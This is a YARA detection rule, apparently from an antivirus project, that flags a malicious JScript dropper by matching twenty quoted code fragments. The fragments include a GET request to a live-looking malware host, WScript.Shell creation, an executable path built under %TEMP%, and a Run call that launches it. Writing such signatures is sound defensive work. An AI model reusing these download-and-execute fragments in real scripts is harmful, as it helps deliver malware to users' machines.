rule sig_20160330_1df73a1a7a5fbc44f9bc345030e754dd {
  meta:
    description = "datamaliciousorder - file 20160330_1df73a1a7a5fbc44f9bc345030e754dd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ef60e1a60ccfbc766921dee5f11c3063f81a3c603dcd671f33eea7b2c88866ea"

  strings:
    $s1  = "SQ[RE](\"GET\", \"http://a-ntsuhan.com/k38sav\", false);" fullword ascii
    $s2  = "function UW(J1, IZ){XJ = XJ * 1; return J1 - IZ;};" fullword ascii
    $s3  = "if (SQ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "var CA = function RH() {return WScript[K](\"WScript\"+\".Shell\");}(), Z = 11;" fullword ascii
    $s5  = "function N(){return U + \"\";};" fullword ascii
    $s6  = "function J() {return ((RW == true) && (RW == MZ)) ? 1 : XJ;};" fullword ascii
    $s7  = "}while (A);" fullword ascii
    $s8  = "function BP(){return 22;};" fullword ascii
    $s9  = "function WQ()" fullword ascii
    $s10 = "var J0 = new this[\"Date\"]();" fullword ascii
    $s11 = "return UW(BD, I);" fullword ascii
    $s12 = "function MU(TF) {var ZK = (1, 2, 3, 4, 5, TF); return ZK;};" fullword ascii
    $s13 = "function ZJ() {return CA[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"EN7w5Skipbt.ex\" + \"e\";};" fullword ascii
    $s14 = "function F(){return K;};" fullword ascii
    $s15 = "function RY(HZ){CA[\"Run\"](HZ, XJ, XJ);};" fullword ascii
    $s16 = "var RW = false;" fullword ascii
    $s17 = "MZ = true; " fullword ascii
    $s18 = "var MZ = false;" fullword ascii
    $s19 = "var N1 = false;" fullword ascii
    $s20 = "RW = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}